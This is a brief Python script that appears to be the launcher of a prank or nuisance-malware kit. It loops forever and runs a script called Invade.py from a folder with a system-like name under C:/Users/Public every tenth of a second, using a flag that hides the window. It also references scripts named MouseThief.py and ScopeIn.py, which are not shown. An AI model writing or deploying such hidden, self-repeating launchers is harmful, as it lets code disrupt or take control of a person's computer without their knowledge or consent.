import os
from time import sleep
import random
import subprocess
import psutil

path = "C:/users/" + os.getlogin() + "/AppData/Local/Programs/Python/Python312/python.exe "

invade = path + 'C:/Users/Public/Kernal46/PythonBased/Invade.py'
#print('invade is now', invade)
mouseThief = path + 'C:/Users/Public/Kernal46/PythonBased/MouseThief.py'
scopeIn = path + 'C:/Users/Public/Kernal46/PythonBased/ScopeIn.py'
print(invade)

print('step 1')
CREATE_NO_WINDOW = 0x08000000
#sleep(1)
print('starting')
while True:
    #print('count is currently', count)
    r = (int)(random.random() * 3)
    r = 0
    if (r == 0):
        print('invade')
        subprocess.call(invade, creationflags = CREATE_NO_WINDOW)
    sleep(.1)
    print('starting again')